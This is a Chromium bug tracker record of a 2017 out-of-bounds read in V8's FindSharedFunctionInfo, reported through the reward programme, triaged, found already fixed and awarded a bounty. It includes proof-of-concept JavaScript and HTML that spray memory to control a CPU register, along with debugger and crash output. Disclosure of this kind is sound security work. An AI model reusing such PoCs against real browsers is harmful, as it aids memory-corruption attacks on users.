# Security: Out of bounds at FindSharedFunctionInfo in v8

| Field | Value |
|-------|-------|
| **Issue ID** | [40088745](https://issues.chromium.org/issues/40088745) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ju...@gmail.com |
| **Assignee** | ad...@chromium.org |
| **Created** | 2017-08-18 |
| **Bounty** | $3,000.00 |

## Description

VULNERABILITY DETAILS

I guess this vulnerability strongly related with https://bugs.chromium.org/p/chromium/issues/detail?id=715582.


VERSION
Chrome Version: 60.0.3112.101 (stable), v8(6.0.286.52)

REPRODUCTION CASE

=== poc.js ===
this.__defineGetter__("x", (
    a0 = (function () {})(),
    a1 = (function () {})(),
    a2 = (function () {})(),
    a3 = (function () {})(),
    a4 = (function () {})(),
    a5 = (function () {})(),
    a6 = (function () {})(),
    a7 = (function () {})(),
    a8 = (function () {})(),
    a9 = (function () {})(),
    a10 = (function () {})(),
    a11 = (function () {})(),
    a12 = (function () {})(),
    a13 = (function () {})(),
    a14 = (function () {})(),
    a15 = (function () {})(),
    a16 = (function () {})(),
    a17 = (function () {})(),
    a18 = (function () {})(),
    a19 = (function () {})(),
    a20 = (function () {})(),
    a21 = (function () {})(),
    a22 = (function () {})(),
    a23 = (function () {})(),
    a24 = (function () {})(),
    a25 = (function () {})(),
    a26 = (function () {})(),
    a27 = (function () {})(),
    a28 = (function () {})(),
    a29 = (function () {})(),
    a30 = (function () {})(),
    a31 = (function () {})(),
    a32 = (function () {})(),
    a33 = (function () {})(),
    a34 = (function () {})(),
    a35 = (function () {})(),
    a = (function(x=0) { function arguments() {} })()) => {}, 
    a1 = (function() {
        let arr = [];
        for(var i = 0; i < 23; i++) {
            arr.push(0x20202020); // spray memory to 0x20202020 << 1 == 0x40404040
        }
    })()
);
x;

================

poc.js can contorl eax register with memory spraying.
I tested in ubuntu 16.04 LTS, v8 compiled 32bit.

$ gdb -q --args ~/v8/out.gn/ia32.release/d8 poc.js
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
0x56ab00e3 in v8::internal::Script::FindSharedFunctionInfo(v8::internal::Isolate*, v8::internal::FunctionLiteral const*) ()
(gdb) x/i $pc
=> 0x56ab00e3 <_ZN2v88internal6Script22FindSharedFunctionInfoEPNS0_7IsolateEPKNS0_15FunctionLiteralE+51>:       mov    0x3(%eax),%edi
(gdb) i r eax
eax            0x40404040       1077952576



## Attachments

- [POC.html](attachments/POC.html) (text/plain, 1.7 KB)

## Timeline

### ju...@gmail.com (2017-08-18)

and this is a poc, just generate segfault in same environment

this.__defineGetter__("x", (
    a = (function(x=0) { function arguments() {} })()) => {}
);
x;

The backtrace follows:

$ ~/v8/out.gn/ia32.release/d8 poc1.js
Received signal 11 SEGV_MAPERR 00000600001c

==== C stack trace ===============================

 [0x0000570480d4]
 [0x0000f776bbd0]
 [0x000056ba10f1]
 [0x0000567b7ee1]
 [0x000056b0abe8]
 [0x000056b0aaca]
 [0x000056b214ab]
 [0x0000567b8a97]
 [0x0000567b9fb9]
 [0x0000567b99fd]
 [0x0000567b4eda]
 [0x0000567b36df]
 [0x000056c91b4e]
 [0x0000351063fe]
 [0x000035106636]
 [0x0000351074d6]
 [0x00003517e01e]
 [0x000035106098]
 [0x000056a22c2a]
 [0x000056a228be]
 [0x000056b6d78f]
 [0x000056b6cb8c]
 [0x000056adcacd]
 [0x000056add4e3]
 [0x000056ae71ec]
 [0x0000351063fe]
 [0x000057f2e9af]
 [0x00003517ea74]
 [0x00003517e01e]
 [0x000035106098]
 [0x000056a22c2a]
 [0x000056a228be]
 [0x0000566b4c30]
 [0x000056695ce8]
 [0x00005669f5cf]
 [0x0000566a16df]
 [0x0000566a2973]
 [0x0000566a2c94]
 [0x0000f73a1637]
[end of stack trace]
Segmentation fault (core dumped)


### cl...@chromium.org (2017-08-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4972303699148800.

### el...@chromium.org (2017-08-18)

[Comment Deleted]

[Monorail components: Blink>JavaScript]

### ju...@gmail.com (2017-08-18)

of course. this poc still available in the stable Chrome 60 (windows, os x.)
I did not test in Linux yet.

=== poc.html ====

<html>
<script>

this.__defineGetter__("x", (
            a0 = (function () {})(),
            a1 = (function () {})(),
            a2 = (function () {})(),
            a3 = (function () {})(),
            a4 = (function () {})(),
            a5 = (function () {})(),
            a6 = (function () {})(),
            a7 = (function () {})(),
            a8 = (function () {})(),
            a9 = (function () {})(),
            a10 = (function () {})(),
            a11 = (function () {})(),
            a12 = (function () {})(),
            a13 = (function () {})(),
            a14 = (function () {})(),
            a15 = (function () {})(),
            a16 = (function () {})(),
            a17 = (function () {})(),
            a18 = (function () {})(),
            a19 = (function () {})(),
            a20 = (function () {})(),
            a21 = (function () {})(),
            a22 = (function () {})(),
            a23 = (function () {})(),
            a24 = (function () {})(),
            a25 = (function () {})(),
            a26 = (function () {})(),
            a27 = (function () {})(),
            a28 = (function () {})(),
            a29 = (function () {})(),
            a30 = (function () {})(),
            a31 = (function () {})(),
            a32 = (function () {})(),
            a33 = (function () {})(),
            a34 = (function () {})(),
            a35 = (function () {})(),
            a = (function(x=0) { function arguments() {} })()) => {}, 
            a1 = (function() {
                let arr = [];
                for(var i = 0; i < 23; i++) {
                    arr.push(0x20202020); // spray memory to 0x20202020 << 1 == 0x40404040
                }
            })()
);
x;


</script>
</html>


### ju...@gmail.com (2017-08-18)

However,  https://crbug.com/chromium/715582 did not work in chrome 60

### el...@chromium.org (2017-08-18)

Indeed, the attached file does result in a ReadAV in 60.3112.

crash/c930bf56a5e51e28 

### cl...@chromium.org (2017-08-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5637472532037632.

### el...@chromium.org (2017-08-18)

Apologies, I didn't notice that your PoC scripts were slightly different than those of 715582.

### jo...@chromium.org (2017-08-21)

[Empty comment from Monorail migration]

### jo...@chromium.org (2017-08-21)

I continue to think that we should put a CHECK_LT in FindSharedFunctionInfo

### ma...@chromium.org (2017-08-22)

I'm able to repro w/ the code in https://crbug.com/chromium/756733#c1 and ia32.release asan build, if I use old enough V8.

Looks like this was already fixed and the fix is:

commit 4c79544cca77f927cddb3849b66e4ffa8fcc70fc (refs/bisect/bad)
Author: Adam Klein <adamk@chromium.org>
Date:   Thu Jun 29 10:19:41 2017 -0700

    [ast] AstTraversalVisitor should visit the Declarations of Block scopes
    
    R=marja@chromium.org
    
    Bug: v8:6509
    Change-Id: If8be12e2ce6c00de0bdee38ab721ef5b7b47efe5
    Reviewed-on: https://chromium-review.googlesource.com/556239
    Reviewed-by: Marja Hölttä <marja@chromium.org>
    Commit-Queue: Adam Klein <adamk@chromium.org>
    Cr-Commit-Position: refs/heads/master@{#46331}

Not surprisingly, that commit is a fix to https://bugs.chromium.org/p/v8/issues/detail?id=6509 which is basically the same bug as this.

So hmm, I guess we should just merge that maybe? To which branch do you want this fix? It's relatively low-risk.


### sh...@chromium.org (2017-08-22)

This bug requires manual review: We are only 13 days from stable.
Please contact the milestone owner if you have questions.
Owners: amineer@(Android), cmasso@(iOS), ketakid@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2017-08-22)

[Empty comment from Monorail migration]

### ca...@chromium.org (2017-08-22)

Please add appropriate OSs.

### ad...@chromium.org (2017-08-22)

[Empty comment from Monorail migration]

### go...@chromium.org (2017-08-22)

+awhalley@ security TPM for M61 merge review.

### go...@chromium.org (2017-08-22)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-08-24)

govind@ - good for 61

### go...@chromium.org (2017-08-24)

Approving merge to M61 branch 3163 based on https://crbug.com/chromium/756733#c18. Please merge ASAP. Thank you.

### ma...@chromium.org (2017-08-24)

Oops, looks like the patch is in 61 already. Sorry for the noise.

### ma...@chromium.org (2017-08-24)

[Empty comment from Monorail migration]

### ha...@chromium.org (2017-09-06)

60 is already EOL

### aw...@google.com (2017-11-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-11-16)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-11-16)

Nice one! The VRP panel decided to award $3,000 for this report!

### aw...@chromium.org (2017-11-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-07-28)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-28)

This issue was migrated from crbug.com/chromium/756733?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088745)*
